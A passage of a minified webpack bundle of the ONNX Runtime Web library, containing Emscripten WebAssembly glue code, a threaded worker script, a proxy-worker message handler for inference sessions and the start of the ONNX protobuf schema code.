"+g);E("falling back to ArrayBuffer instantiation");return oa(c,a,b)}))}var S;function qa(a){this.name="ExitStatus";this.message=`Program terminated with exit(${a})`;this.status=a}var T=a=>{for(;0<a.length;)a.shift()(e)};\r\nfunction ra(a){this.qa=a-24;this.va=function(b){N[this.qa+4>>2>>>0]=b};this.ua=function(b){N[this.qa+8>>2>>>0]=b};this.sa=function(b,c){this.ta();this.va(b);this.ua(c)};this.ta=function(){N[this.qa+16>>2>>>0]=0}}\r\nvar sa=0,ta=0,ua="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0,va=(a,b,c)=>{b>>>=0;var f=b+c;for(c=b;a[c]&&!(c>=f);)++c;if(16<c-b&&a.buffer&&ua)return ua.decode(a.subarray(b,c));for(f="";b<c;){var g=a[b++];if(g&128){var k=a[b++]&63;if(192==(g&224))f+=String.fromCharCode((g&31)<<6|k);else{var l=a[b++]&63;g=224==(g&240)?(g&15)<<12|k<<6|l:(g&7)<<18|k<<12|l<<6|a[b++]&63;65536>g?f+=String.fromCharCode(g):(g-=65536,f+=String.fromCharCode(55296|g>>10,56320|g&1023))}}else f+=String.fromCharCode(g)}return f},\r\nU=(a,b)=>(a>>>=0)?va(L,a,b):"",V=a=>{for(var b=0,c=0;c<a.length;++c){var f=a.charCodeAt(c);127>=f?b++:2047>=f?b+=2:55296<=f&&57343>=f?(b+=4,++c):b+=3}return b},W=(a,b,c,f)=>{c>>>=0;if(!(0<f))return 0;var g=c;f=c+f-1;for(var k=0;k<a.length;++k){var l=a.charCodeAt(k);if(55296<=l&&57343>=l){var r=a.charCodeAt(++k);l=65536+((l&1023)<<10)|r&1023}if(127>=l){if(c>=f)break;b[c++>>>0]=l}else{if(2047>=l){if(c+1>=f)break;b[c++>>>0]=192|l>>6}else{if(65535>=l){if(c+2>=f)break;b[c++>>>0]=224|l>>12}else{if(c+3>=\r\nf)break;b[c++>>>0]=240|l>>18;b[c++>>>0]=128|l>>12&63}b[c++>>>0]=128|l>>6&63}b[c++>>>0]=128|l&63}}b[c>>>0]=0;return c-g},X=a=>0===a%4&&(0!==a%100||0===a%400),wa=[0,31,60,91,121,152,182,213,244,274,305,335],xa=[0,31,59,90,120,151,181,212,243,273,304,334],Ca=a=>{var b=V(a)+1,c=ya(b);c&&W(a,L,c,b);return c},Y={},Ea=()=>{if(!Da){var a={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-",\r\n"_")+".UTF-8",_:m||"./this.program"},b;for(b in Y)void 0===Y[b]?delete a[b]:a[b]=Y[b];var c=[];for(b in a)c.push(`${b}=${a[b]}`);Da=c}return Da},Da,Fa=[null,[],[]],Ga=()=>{if("object"==typeof crypto&&"function"==typeof crypto.getRandomValues)return c=>crypto.getRandomValues(c);if(x)try{var a=__webpack_require__(/*! crypto */ "?892d");if(a.randomFillSync)return c=>a.randomFillSync(c);var b=a.randomBytes;return c=>(c.set(b(c.byteLength)),c)}catch(c){}G("initRandomDevice")},Ha=a=>(Ha=Ga())(a),Ia=[31,29,31,30,31,30,31,31,30,\r\n31,30,31],Ja=[31,28,31,30,31,30,31,31,30,31,30,31];function Ka(a){var b=Array(V(a)+1);W(a,b,0,b.length);return b}\r\nfunction La(a,b,c,f){function g(d,n,p){for(d="number"==typeof d?d.toString():d||"";d.length<n;)d=p[0]+d;return d}function k(d,n){return g(d,n,"0")}function l(d,n){function p(za){return 0>za?-1:0<za?1:0}var z;0===(z=p(d.getFullYear()-n.getFullYear()))&&0===(z=p(d.getMonth()-n.getMonth()))&&(z=p(d.getDate()-n.getDate()));return z}function r(d){switch(d.getDay()){case 0:return new Date(d.getFullYear()-1,11,29);case 1:return d;case 2:return new Date(d.getFullYear(),0,3);case 3:return new Date(d.getFullYear(),\r\n0,2);case 4:return new Date(d.getFullYear(),0,1);case 5:return new Date(d.getFullYear()-1,11,31);case 6:return new Date(d.getFullYear()-1,11,30)}}function w(d){var n=d.ma;for(d=new Date((new Date(d.na+1900,0,1)).getTime());0<n;){var p=d.getMonth(),z=(X(d.getFullYear())?Ia:Ja)[p];if(n>z-d.getDate())n-=z-d.getDate()+1,d.setDate(1),11>p?d.setMonth(p+1):(d.setMonth(0),d.setFullYear(d.getFullYear()+1));else{d.setDate(d.getDate()+n);break}}p=new Date(d.getFullYear()+1,0,4);n=r(new Date(d.getFullYear(),\r\n0,4));p=r(p);return 0>=l(n,d)?0>=l(p,d)?d.getFullYear()+1:d.getFullYear():d.getFullYear()-1}a>>>=0;b>>>=0;c>>>=0;f>>>=0;var t=M[f+40>>2>>>0];f={ya:M[f>>2>>>0],xa:M[f+4>>2>>>0],oa:M[f+8>>2>>>0],ra:M[f+12>>2>>>0],pa:M[f+16>>2>>>0],na:M[f+20>>2>>>0],ha:M[f+24>>2>>>0],ma:M[f+28>>2>>>0],Aa:M[f+32>>2>>>0],wa:M[f+36>>2>>>0],za:t?U(t):""};c=U(c);t={"%c":"%a %b %d %H:%M:%S %Y","%D":"%m/%d/%y","%F":"%Y-%m-%d","%h":"%b","%r":"%I:%M:%S %p","%R":"%H:%M","%T":"%H:%M:%S","%x":"%m/%d/%y","%X":"%H:%M:%S","%Ec":"%c",\r\n"%EC":"%C","%Ex":"%m/%d/%y","%EX":"%H:%M:%S","%Ey":"%y","%EY":"%Y","%Od":"%d","%Oe":"%e","%OH":"%H","%OI":"%I","%Om":"%m","%OM":"%M","%OS":"%S","%Ou":"%u","%OU":"%U","%OV":"%V","%Ow":"%w","%OW":"%W","%Oy":"%y"};for(var u in t)c=c.replace(new RegExp(u,"g"),t[u]);var Aa="Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),Ba="January February March April May June July August September October November December".split(" ");t={"%a":d=>Aa[d.ha].substring(0,3),"%A":d=>Aa[d.ha],"%b":d=>\r\nBa[d.pa].substring(0,3),"%B":d=>Ba[d.pa],"%C":d=>k((d.na+1900)/100|0,2),"%d":d=>k(d.ra,2),"%e":d=>g(d.ra,2," "),"%g":d=>w(d).toString().substring(2),"%G":d=>w(d),"%H":d=>k(d.oa,2),"%I":d=>{d=d.oa;0==d?d=12:12<d&&(d-=12);return k(d,2)},"%j":d=>{for(var n=0,p=0;p<=d.pa-1;n+=(X(d.na+1900)?Ia:Ja)[p++]);return k(d.ra+n,3)},"%m":d=>k(d.pa+1,2),"%M":d=>k(d.xa,2),"%n":()=>"\\n","%p":d=>0<=d.oa&&12>d.oa?"AM":"PM","%S":d=>k(d.ya,2),"%t":()=>"\\t","%u":d=>d.ha||7,"%U":d=>k(Math.floor((d.ma+7-d.ha)/7),2),"%V":d=>\r\n{var n=Math.floor((d.ma+7-(d.ha+6)%7)/7);2>=(d.ha+371-d.ma-2)%7&&n++;if(n)53==n&&(p=(d.ha+371-d.ma)%7,4==p||3==p&&X(d.na)||(n=1));else{n=52;var p=(d.ha+7-d.ma-1)%7;(4==p||5==p&&X(d.na%400-1))&&n++}return k(n,2)},"%w":d=>d.ha,"%W":d=>k(Math.floor((d.ma+7-(d.ha+6)%7)/7),2),"%y":d=>(d.na+1900).toString().substring(2),"%Y":d=>d.na+1900,"%z":d=>{d=d.wa;var n=0<=d;d=Math.abs(d)/60;return(n?"+":"-")+String("0000"+(d/60*100+d%60)).slice(-4)},"%Z":d=>d.za,"%%":()=>"%"};c=c.replace(/%%/g,"\\x00\\x00");for(u in t)c.includes(u)&&\r\n(c=c.replace(new RegExp(u,"g"),t[u](f)));c=c.replace(/\\0\\0/g,"%");u=Ka(c);if(u.length>b)return 0;K.set(u,a>>>0);return u.length-1}\r\nvar Na={a:function(a,b,c){a>>>=0;(new ra(a)).sa(b>>>0,c>>>0);sa=a;ta++;throw sa;},e:function(){return 0},I:function(){},y:function(){},A:function(){},K:function(){return 0},G:function(){},B:function(){},F:function(){},g:function(){},z:function(){},w:function(){},H:function(){},x:function(){},k:()=>!0,n:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN;c>>>=0;a=new Date(1E3*a);M[c>>2>>>0]=a.getUTCSeconds();M[c+4>>2>>>0]=a.getUTCMinutes();M[c+8>>2>>>0]=a.getUTCHours();M[c+12>>2>>>\r\n0]=a.getUTCDate();M[c+16>>2>>>0]=a.getUTCMonth();M[c+20>>2>>>0]=a.getUTCFullYear()-1900;M[c+24>>2>>>0]=a.getUTCDay();M[c+28>>2>>>0]=(a.getTime()-Date.UTC(a.getUTCFullYear(),0,1,0,0,0,0))/864E5|0},o:function(a,b,c){a=b+2097152>>>0<4194305-!!a?(a>>>0)+4294967296*b:NaN;c>>>=0;a=new Date(1E3*a);M[c>>2>>>0]=a.getSeconds();M[c+4>>2>>>0]=a.getMinutes();M[c+8>>2>>>0]=a.getHours();M[c+12>>2>>>0]=a.getDate();M[c+16>>2>>>0]=a.getMonth();M[c+20>>2>>>0]=a.getFullYear()-1900;M[c+24>>2>>>0]=a.getDay();M[c+28>>2>>>\r\n0]=(X(a.getFullYear())?wa:xa)[a.getMonth()]+a.getDate()-1|0;M[c+36>>2>>>0]=-(60*a.getTimezoneOffset());b=(new Date(a.getFullYear(),6,1)).getTimezoneOffset();var f=(new Date(a.getFullYear(),0,1)).getTimezoneOffset();M[c+32>>2>>>0]=(b!=f&&a.getTimezoneOffset()==Math.min(f,b))|0},p:function(a){a>>>=0;var b=new Date(M[a+20>>2>>>0]+1900,M[a+16>>2>>>0],M[a+12>>2>>>0],M[a+8>>2>>>0],M[a+4>>2>>>0],M[a>>2>>>0],0),c=M[a+32>>2>>>0],f=b.getTimezoneOffset(),g=(new Date(b.getFullYear(),6,1)).getTimezoneOffset(),\r\nk=(new Date(b.getFullYear(),0,1)).getTimezoneOffset(),l=Math.min(k,g);0>c?M[a+32>>2>>>0]=Number(g!=k&&l==f):0<c!=(l==f)&&(g=Math.max(k,g),b.setTime(b.getTime()+6E4*((0<c?l:g)-f)));M[a+24>>2>>>0]=b.getDay();M[a+28>>2>>>0]=(X(b.getFullYear())?wa:xa)[b.getMonth()]+b.getDate()-1|0;M[a>>2>>>0]=b.getSeconds();M[a+4>>2>>>0]=b.getMinutes();M[a+8>>2>>>0]=b.getHours();M[a+12>>2>>>0]=b.getDate();M[a+16>>2>>>0]=b.getMonth();M[a+20>>2>>>0]=b.getYear();a=b.getTime()/1E3;return Ma((S=a,1<=+Math.abs(S)?0<S?+Math.floor(S/\r\n4294967296)>>>0:~~+Math.ceil((S-+(~~S>>>0))/4294967296)>>>0:0)),a>>>0},l:function(){return-52},m:function(){},u:function(a,b,c){function f(w){return(w=w.toTimeString().match(/\\(([A-Za-z ]+)\\)$/))?w[1]:"GMT"}c>>>=0;var g=(new Date).getFullYear(),k=new Date(g,0,1),l=new Date(g,6,1);g=k.getTimezoneOffset();var r=l.getTimezoneOffset();N[a>>>0>>2>>>0]=60*Math.max(g,r);M[b>>>0>>2>>>0]=Number(g!=r);a=f(k);b=f(l);a=Ca(a);b=Ca(b);r<g?(N[c>>2>>>0]=a,N[c+4>>2>>>0]=b):(N[c>>2>>>0]=b,N[c+4>>2>>>0]=a)},d:()=>{G("")},\r\nh:function(){return Date.now()},v:function(){return 4294901760},b:()=>performance.now(),J:function(a,b,c){b>>>=0;return L.copyWithin(a>>>0>>>0,b>>>0,b+(c>>>0)>>>0)},t:function(a){a>>>=0;var b=L.length;if(4294901760<a)return!1;for(var c=1;4>=c;c*=2){var f=b*(1+.2/c);f=Math.min(f,a+100663296);var g=Math;f=Math.max(a,f);a:{g=g.min.call(g,4294901760,f+(65536-f%65536)%65536)-H.buffer.byteLength+65535>>>16;try{H.grow(g);ea();var k=1;break a}catch(l){}k=void 0}if(k)return!0}return!1},D:function(a,b){a>>>=\r\n0;b>>>=0;var c=0;Ea().forEach(function(f,g){var k=b+c;g=N[a+4*g>>2>>>0]=k;for(k=0;k<f.length;++k)K[g++>>0>>>0]=f.charCodeAt(k);K[g>>0>>>0]=0;c+=f.length+1});return 0},E:function(a,b){a>>>=0;b>>>=0;var c=Ea();N[a>>2>>>0]=c.length;var f=0;c.forEach(function(g){f+=g.length+1});N[b>>2>>>0]=f;return 0},s:a=>{if(!noExitRuntime){if(e.onExit)e.onExit(a);J=!0}q(a,new qa(a))},f:()=>52,j:function(){return 52},q:function(){return 70},i:function(a,b,c,f){b>>>=0;c>>>=0;f>>>=0;for(var g=0,k=0;k<c;k++){var l=N[b>>\r\n2>>>0],r=N[b+4>>2>>>0];b+=8;for(var w=0;w<r;w++){var t=L[l+w>>>0],u=Fa[a];0===t||10===t?((1===a?da:E)(va(u,0)),u.length=0):u.push(t)}g+=r}N[f>>2>>>0]=g;return 0},r:function(a,b){a>>>=0;Ha(L.subarray(a>>>0,a+(b>>>0)>>>0));return 0},C:La,c:function(a,b,c,f){return La(a>>>0,b>>>0,c>>>0,f>>>0)}};\r\n(function(){function a(c){c=c.exports;I=c=Oa(c);H=I.L;ea();ha.unshift(I.M);O--;e.monitorRunDependencies&&e.monitorRunDependencies(O);if(0==O&&(null!==P&&(clearInterval(P),P=null),Q)){var f=Q;Q=null;f()}return c}var b={a:Na};O++;e.monitorRunDependencies&&e.monitorRunDependencies(O);if(e.instantiateWasm)try{return e.instantiateWasm(b,a)}catch(c){E("Module.instantiateWasm callback failed with error: "+c),h(c)}pa(b,function(c){a(c.instance)}).catch(h);return{}})();\r\ne._OrtInit=(a,b)=>(e._OrtInit=I.N)(a,b);e._OrtGetLastError=(a,b)=>(e._OrtGetLastError=I.O)(a,b);e._OrtCreateSessionOptions=(a,b,c,f,g,k,l,r,w,t)=>(e._OrtCreateSessionOptions=I.P)(a,b,c,f,g,k,l,r,w,t);e._OrtAppendExecutionProvider=(a,b)=>(e._OrtAppendExecutionProvider=I.Q)(a,b);e._OrtAddSessionConfigEntry=(a,b,c)=>(e._OrtAddSessionConfigEntry=I.R)(a,b,c);e._OrtReleaseSessionOptions=a=>(e._OrtReleaseSessionOptions=I.S)(a);e._OrtCreateSession=(a,b,c)=>(e._OrtCreateSession=I.T)(a,b,c);\r\ne._OrtReleaseSession=a=>(e._OrtReleaseSession=I.U)(a);e._OrtGetInputOutputCount=(a,b,c)=>(e._OrtGetInputOutputCount=I.V)(a,b,c);e._OrtGetInputName=(a,b)=>(e._OrtGetInputName=I.W)(a,b);e._OrtGetOutputName=(a,b)=>(e._OrtGetOutputName=I.X)(a,b);e._OrtFree=a=>(e._OrtFree=I.Y)(a);e._OrtCreateTensor=(a,b,c,f,g)=>(e._OrtCreateTensor=I.Z)(a,b,c,f,g);e._OrtGetTensorData=(a,b,c,f,g)=>(e._OrtGetTensorData=I._)(a,b,c,f,g);e._OrtReleaseTensor=a=>(e._OrtReleaseTensor=I.$)(a);\r\ne._OrtCreateRunOptions=(a,b,c,f)=>(e._OrtCreateRunOptions=I.aa)(a,b,c,f);e._OrtAddRunConfigEntry=(a,b,c)=>(e._OrtAddRunConfigEntry=I.ba)(a,b,c);e._OrtReleaseRunOptions=a=>(e._OrtReleaseRunOptions=I.ca)(a);e._OrtRun=(a,b,c,f,g,k,l,r)=>(e._OrtRun=I.da)(a,b,c,f,g,k,l,r);e._OrtEndProfiling=a=>(e._OrtEndProfiling=I.ea)(a);var ya=e._malloc=a=>(ya=e._malloc=I.fa)(a);e._free=a=>(e._free=I.ga)(a);var Ma=a=>(Ma=I.ia)(a),Pa=()=>(Pa=I.ja)(),Qa=a=>(Qa=I.ka)(a),Ra=a=>(Ra=I.la)(a);\r\nfunction Oa(a){a=Object.assign({},a);var b=f=>()=>f()>>>0,c=f=>g=>f(g)>>>0;a.__errno_location=b(a.__errno_location);a.malloc=c(a.malloc);a.stackSave=b(a.stackSave);a.stackAlloc=c(a.stackAlloc);return a}e.stackAlloc=Ra;e.stackSave=Pa;e.stackRestore=Qa;e.UTF8ToString=U;e.stringToUTF8=(a,b,c)=>W(a,L,b,c);e.lengthBytesUTF8=V;var Z;Q=function Sa(){Z||Ta();Z||(Q=Sa)};\r\nfunction Ta(){function a(){if(!Z&&(Z=!0,e.calledRun=!0,!J)){T(ha);aa(e);if(e.onRuntimeInitialized)e.onRuntimeInitialized();if(e.postRun)for("function"==typeof e.postRun&&(e.postRun=[e.postRun]);e.postRun.length;){var b=e.postRun.shift();ia.unshift(b)}T(ia)}}if(!(0<O)){if(e.preRun)for("function"==typeof e.preRun&&(e.preRun=[e.preRun]);e.preRun.length;)ja();T(fa);0<O||(e.setStatus?(e.setStatus("Running..."),setTimeout(function(){setTimeout(function(){e.setStatus("")},1);a()},1)):a())}}\r\nif(e.preInit)for("function"==typeof e.preInit&&(e.preInit=[e.preInit]);0<e.preInit.length;)e.preInit.pop()();Ta();\r\n\r\n\r\n  return moduleArg.ready\r\n}\r\n\r\n);\r\n})();\r\nif (true)\r\n  module.exports = ortWasm;\r\nelse {}\r\n\n\n/***/ }),\n\n/***/ "./lib/wasm/binding/ort-wasm-threaded.worker.js":\n/*!******************************************************!*\\\n  !*** ./lib/wasm/binding/ort-wasm-threaded.worker.js ***!\n  \\******************************************************/\n/***/ ((module) => {\n\n"use strict";\nmodule.exports = "\\"use strict\\";var Module={};var ENVIRONMENT_IS_NODE=typeof process==\\"object\\"&&typeof process.versions==\\"object\\"&&typeof process.versions.node==\\"string\\";if(ENVIRONMENT_IS_NODE){var nodeWorkerThreads=require(\\"worker_threads\\");var parentPort=nodeWorkerThreads.parentPort;parentPort.on(\\"message\\",data=>onmessage({data:data}));var fs=require(\\"fs\\");Object.assign(global,{self:global,require:require,Module:Module,location:{href:__filename},Worker:nodeWorkerThreads.Worker,importScripts:f=>(0,eval)(fs.readFileSync(f,\\"utf8\\")+\\"//# sourceURL=\\"+f),postMessage:msg=>parentPort.postMessage(msg),performance:global.performance||{now:Date.now}})}var initializedJS=false;function threadPrintErr(){var text=Array.prototype.slice.call(arguments).join(\\" \\");if(ENVIRONMENT_IS_NODE){fs.writeSync(2,text+\\"\\\\n\\");return}console.error(text)}function threadAlert(){var text=Array.prototype.slice.call(arguments).join(\\" \\");postMessage({cmd:\\"alert\\",text:text,threadId:Module[\\"_pthread_self\\"]()})}var err=threadPrintErr;self.alert=threadAlert;Module[\\"instantiateWasm\\"]=(info,receiveInstance)=>{var module=Module[\\"wasmModule\\"];Module[\\"wasmModule\\"]=null;var instance=new WebAssembly.Instance(module,info);return receiveInstance(instance)};self.onunhandledrejection=e=>{throw e.reason??e};function handleMessage(e){try{if(e.data.cmd===\\"load\\"){let messageQueue=[];self.onmessage=e=>messageQueue.push(e);self.startWorker=instance=>{Module=instance;postMessage({\\"cmd\\":\\"loaded\\"});for(let msg of messageQueue){handleMessage(msg)}self.onmessage=handleMessage};Module[\\"wasmModule\\"]=e.data.wasmModule;for(const handler of e.data.handlers){Module[handler]=(...args)=>{postMessage({cmd:\\"callHandler\\",handler:handler,args:args})}}Module[\\"wasmMemory\\"]=e.data.wasmMemory;Module[\\"buffer\\"]=Module[\\"wasmMemory\\"].buffer;Module[\\"ENVIRONMENT_IS_PTHREAD\\"]=true;if(typeof e.data.urlOrBlob==\\"string\\"){importScripts(e.data.urlOrBlob)}else{var objectUrl=URL.createObjectURL(e.data.urlOrBlob);importScripts(objectUrl);URL.revokeObjectURL(objectUrl)}ortWasmThreaded(Module)}else if(e.data.cmd===\\"run\\"){Module[\\"__emscripten_thread_init\\"](e.data.pthread_ptr,/*isMainBrowserThread=*/0,/*isMainRuntimeThread=*/0,/*canBlock=*/1);Module[\\"__emscripten_thread_mailbox_await\\"](e.data.pthread_ptr);Module[\\"establishStackSpace\\"]();Module[\\"PThread\\"].receiveObjectTransfer(e.data);Module[\\"PThread\\"].threadInitTLS();if(!initializedJS){initializedJS=true}try{Module[\\"invokeEntryPoint\\"](e.data.start_routine,e.data.arg)}catch(ex){if(ex!=\\"unwind\\"){throw ex}}}else if(e.data.cmd===\\"cancel\\"){if(Module[\\"_pthread_self\\"]()){Module[\\"__emscripten_thread_exit\\"](-1)}}else if(e.data.target===\\"setimmediate\\"){}else if(e.data.cmd===\\"checkMailbox\\"){if(initializedJS){Module[\\"checkMailbox\\"]()}}else if(e.data.cmd){err(\\"worker.js received unknown command \\"+e.data.cmd);err(e.data)}}catch(ex){if(Module[\\"__emscripten_thread_crashed\\"]){Module[\\"__emscripten_thread_crashed\\"]()}throw ex}}self.onmessage=handleMessage;\\r\\n";\n\n/***/ }),\n\n/***/ "?892d":\n/*!************************!*\\\n  !*** crypto (ignored) ***!\n  \\************************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?63c8":\n/*!********************!*\\\n  !*** fs (ignored) ***!\n  \\********************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?aedb":\n/*!********************!*\\\n  !*** os (ignored) ***!\n  \\********************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?75c6":\n/*!**********************!*\\\n  !*** path (ignored) ***!\n  \\**********************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?674f":\n/*!****************************!*\\\n  !*** perf_hooks (ignored) ***!\n  \\****************************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?c6f7":\n/*!********************************!*\\\n  !*** worker_threads (ignored) ***!\n  \\********************************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ }),\n\n/***/ "?7aa5":\n/*!**********************!*\\\n  !*** path (ignored) ***!\n  \\**********************/\n/***/ (() => {\n\n/* (ignored) */\n\n/***/ })\n\n/******/ \t});\n/************************************************************************/\n/******/ \t// The module cache\n/******/ \tvar __webpack_module_cache__ = {};\n/******/ \t\n/******/ \t// The require function\n/******/ \tfunction __webpack_require__(moduleId) {\n/******/ \t\t// Check if module is in cache\n/******/ \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n/******/ \t\tif (cachedModule !== undefined) {\n/******/ \t\t\treturn cachedModule.exports;\n/******/ \t\t}\n/******/ \t\t// Create a new module (and put it into the cache)\n/******/ \t\tvar module = __webpack_module_cache__[moduleId] = {\n/******/ \t\t\t// no module.id needed\n/******/ \t\t\t// no module.loaded needed\n/******/ \t\t\texports: {}\n/******/ \t\t};\n/******/ \t\n/******/ \t\t// Execute the module function\n/******/ \t\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n/******/ \t\n/******/ \t\t// Return the exports of the module\n/******/ \t\treturn module.exports;\n/******/ \t}\n/******/ \t\n/************************************************************************/\nvar __webpack_exports__ = {};\n// This entry need to be wrapped in an IIFE because it need to be in strict mode.\n(() => {\n"use strict";\nvar exports = __webpack_exports__;\n/*!******************************************************************************************************!*\\\n  !*** ../node_modules/ts-loader/index.js??ruleSet[1].rules[0].use[0]!./lib/wasm/proxy-worker/main.ts ***!\n  \\******************************************************************************************************/\n\n// Copyright (c) Microsoft Corporation. All rights reserved.\n// Licensed under the MIT License.\nObject.defineProperty(exports, "__esModule", ({ value: true }));\nconst wasm_core_impl_1 = __webpack_require__(/*! ../wasm-core-impl */ "./lib/wasm/wasm-core-impl.ts");\nconst wasm_factory_1 = __webpack_require__(/*! ../wasm-factory */ "./lib/wasm/wasm-factory.ts");\nself.onmessage = (ev) => {\n    switch (ev.data.type) {\n        case \'init-wasm\':\n            try {\n                (0, wasm_factory_1.initializeWebAssembly)(ev.data.in)\n                    .then(() => postMessage({ type: \'init-wasm\' }), err => postMessage({ type: \'init-wasm\', err }));\n            }\n            catch (err) {\n                postMessage({ type: \'init-wasm\', err });\n            }\n            break;\n        case \'init-ort\':\n            try {\n                (0, wasm_core_impl_1.initRuntime)(ev.data.in).then(() => postMessage({ type: \'init-ort\' }), err => postMessage({\n                    type: \'init-ort\',\n                    err\n                }));\n                postMessage({ type: \'init-ort\' });\n            }\n            catch (err) {\n                postMessage({ type: \'init-ort\', err });\n            }\n            break;\n        case \'create_allocate\':\n            try {\n                const { model } = ev.data.in;\n                const modeldata = (0, wasm_core_impl_1.createSessionAllocate)(model);\n                postMessage({ type: \'create_allocate\', out: modeldata });\n            }\n            catch (err) {\n                postMessage({ type: \'create_allocate\', err });\n            }\n            break;\n        case \'create_finalize\':\n            try {\n                const { modeldata, options } = ev.data.in;\n                const sessionMetadata = (0, wasm_core_impl_1.createSessionFinalize)(modeldata, options);\n                postMessage({ type: \'create_finalize\', out: sessionMetadata });\n            }\n            catch (err) {\n                postMessage({ type: \'create_finalize\', err });\n            }\n            break;\n        case \'create\':\n            try {\n                const { model, options } = ev.data.in;\n                const sessionMetadata = (0, wasm_core_impl_1.createSession)(model, options);\n                postMessage({ type: \'create\', out: sessionMetadata });\n            }\n            catch (err) {\n                postMessage({ type: \'create\', err });\n            }\n            break;\n        case \'release\':\n            try {\n                const handler = ev.data.in;\n                (0, wasm_core_impl_1.releaseSession)(handler);\n                postMessage({ type: \'release\' });\n            }\n            catch (err) {\n                postMessage({ type: \'release\', err });\n            }\n            break;\n        case \'run\':\n            try {\n                const { sessionId, inputIndices, inputs, outputIndices, options } = ev.data.in;\n                (0, wasm_core_impl_1.run)(sessionId, inputIndices, inputs, outputIndices, options)\n                    .then(outputs => {\n                    postMessage({ type: \'run\', out: outputs }, (0, wasm_core_impl_1.extractTransferableBuffers)(outputs));\n                }, err => {\n                    postMessage({ type: \'run\', err });\n                });\n            }\n            catch (err) {\n                postMessage({ type: \'run\', err });\n            }\n            break;\n        case \'end-profiling\':\n            try {\n                const handler = ev.data.in;\n                (0, wasm_core_impl_1.endProfiling)(handler);\n                postMessage({ type: \'end-profiling\' });\n            }\n            catch (err) {\n                postMessage({ type: \'end-profiling\', err });\n            }\n            break;\n        default:\n    }\n};\n\n})();\n\n/******/ })()\n;\n',"Worker",void 0,void 0)}},"../node_modules/worker-loader/dist/runtime/inline.js":module=>{"use strict";module.exports=function(content,workerConstructor,workerOptions,url){var globalScope=self||window;try{try{var blob;try{blob=new globalScope.Blob([content])}catch(e){(blob=new(globalScope.BlobBuilder||globalScope.WebKitBlobBuilder||globalScope.MozBlobBuilder||globalScope.MSBlobBuilder)).append(content),blob=blob.getBlob()}var URL=globalScope.URL||globalScope.webkitURL,objectURL=URL.createObjectURL(blob),worker=new globalScope[workerConstructor](objectURL,workerOptions);return URL.revokeObjectURL(objectURL),worker}catch(e){return new globalScope[workerConstructor]("data:application/javascript,".concat(encodeURIComponent(content)),workerOptions)}}catch(e){if(!url)throw Error("Inline worker is not supported");return new globalScope[workerConstructor](url,workerOptions)}}},"./lib/onnxjs/ort-schema/protobuf/onnx.js":(module,__unused_webpack_exports,__webpack_require__)=>{"use strict";var valuesById,values,onnx,$protobuf=__webpack_require__("./node_modules/protobufjs/minimal.js"),$Reader=$protobuf.Reader,$Writer=$protobuf.Writer,$util=$protobuf.util,$root=$protobuf.roots.default||($protobuf.roots.default={});$root.onnx=((onnx={}).Version=(valuesById={},(values=Object.create(valuesById))[valuesById[0]="_START_VERSION"]=0,values[valuesById[1]="IR_VERSION_2017_10_10"]=1,values[valuesById[2]="IR_VERSION_2017_10_30"]=2,values[valuesById[3]="IR_VERSION_2017_11_3"]=3,values[valuesById[4]="IR_VERSION_2019_1_22"]=4,values[valuesById[5]="IR_VERSION_2019_3_18"]=5,values[valuesById[6]="IR_VERSION_2019_9_19"]=6,values[valuesById[7]="IR_VERSION_2020_5_8"]=7,values[valuesById[8]="IR_VERSION_2021_7_30"]=8,values[valuesById[9]="IR_VERSION"]=9,values),onnx.AttributeProto=function(){function AttributeProto(properties){if(this.floats=[],this.ints=[],this.strings=[],this.tensors=[],this.graphs=[],this.sparseTensors=[],this.typeProtos=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return AttributeProto.prototype.name="",AttributeProto.prototype.refAttrName="",AttributeProto.prototype.docString="",AttributeProto.prototype.type=0,AttributeProto.prototype.f=0,AttributeProto.prototype.i=$util.Long?$util.Long.fromBits(0,0,!1):0,AttributeProto.prototype.s=$util.newBuffer([]),AttributeProto.prototype.t=null,AttributeProto.prototype.g=null,AttributeProto.prototype.sparseTensor=null,AttributeProto.prototype.tp=null,AttributeProto.prototype.floats=$util.emptyArray,AttributeProto.prototype.ints=$util.emptyArray,AttributeProto.prototype.strings=$util.emptyArray,AttributeProto.prototype.tensors=$util.emptyArray,AttributeProto.prototype.graphs=$util.emptyArray,AttributeProto.prototype.sparseTensors=$util.emptyArray,AttributeProto.prototype.typeProtos=$util.emptyArray,AttributeProto.create=function create(properties){return new AttributeProto(properties)},AttributeProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(10).string(message.name),null!=message.f&&Object.hasOwnProperty.call(message,"f")&&writer.uint32(21).float(message.f),null!=message.i&&Object.hasOwnProperty.call(message,"i")&&writer.uint32(24).int64(message.i),null!=message.s&&Object.hasOwnProperty.call(message,"s")&&writer.uint32(34).bytes(message.s),null!=message.t&&Object.hasOwnProperty.call(message,"t")&&$root.onnx.TensorProto.encode(message.t,writer.uint32(42).fork()).ldelim(),null!=message.g&&Object.hasOwnProperty.call(message,"g")&&$root.onnx.GraphProto.encode(message.g,writer.uint32(50).fork()).ldelim(),null!=message.floats&&message.floats.length){writer.uint32(58).fork();for(var 